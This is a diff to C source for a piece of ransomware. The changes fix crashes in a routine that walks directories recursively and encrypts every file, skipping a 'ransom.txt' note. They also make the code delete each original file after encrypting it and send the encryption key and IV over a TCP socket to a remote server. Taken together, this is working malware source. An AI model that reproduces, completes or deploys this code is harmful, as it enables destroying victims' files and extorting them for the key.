@@ -55,22 +55,26 @@ int is_encrypted(char *filename){
     return 0;
 }
 
-void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){    //to do
+void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){ //Segmentation fault (core dumped)
 
     // https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1046380353&id=1044780608
     // Do a recursive function on dir found & exclude. and ..
     struct dirent *dir;
     DIR *d = opendir(name);
+    if(d == NULL){
+        perror("Can't open this file");
+    }
+
     if(d)
     {
-        while ((dir = readdir(d)) != NULL) {
-            char* dirname;
-            strcpy(dirname,dir->d_name);
+        while ((dir = readdir(d)) != NULL) { //loop to encrypt all files in a dir
+            //char* dirname;
+            //strcpy(dirname,dir->d_name);
 
             if( strcmp( dir->d_name, "." ) == 0 || strcmp( dir->d_name, ".." ) == 0 ){
                 continue;
             }
-            char *filename;
+            char filename[BUFSIZE];//char *filename;
             strcpy(filename,name);
             strcat(filename,"/");
             strcat(filename,dir->d_name);
@@ -81,18 +85,20 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
             else {  //if not dir
                 //Encrypt
                 if (de_flag == 0){
-                    // We could add "|| check_file_size(path) == 0" to check if the file is big or not (time saving)
+                    // We could add for exemple"|| check_file_size(path) == 0" to check if the file is big or not (time saving)
                     if((is_encrypted(filename) == 1) || strcmp(filename,"ransom.txt")==0){
                         continue;
                     }
                     else{
                         encrypt(key,iv,filename);
+                        remove(filename);
                     }
                 }
                 //Decrypt
                 if (de_flag == 1){
                     if(is_encrypted(filename) == 0){
                         decrypt(key,iv,filename);
+                        remove(filename);
                     }
                 }
             }
@@ -117,7 +123,7 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 int send_key(char *pKey, char *pIv)
 {
     int sockfd, connfd;
-    struct sockaddr_in servaddr, cli;
+    struct sockaddr_in servaddr, cli,valread;
 
     // socket create and varification
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -143,7 +149,13 @@ int send_key(char *pKey, char *pIv)
         printf("connected to the server..\n");
 
     // function for chat
-    char *msg;
+
+    send(sockfd, pKey, BUFSIZE, 0);
+    send(sockfd, pIv, BUFSIZE, 0);
+
+
+
+/*    char *msg;
     char buffer[BUFSIZE];
     int n;
 
@@ -171,7 +183,7 @@ int send_key(char *pKey, char *pIv)
     memset(pKey, 0, sizeof(char));
     memset(pIv, 0, sizeof(char));
     */
-
+*/
     // close the socket
     close(sockfd);
 }
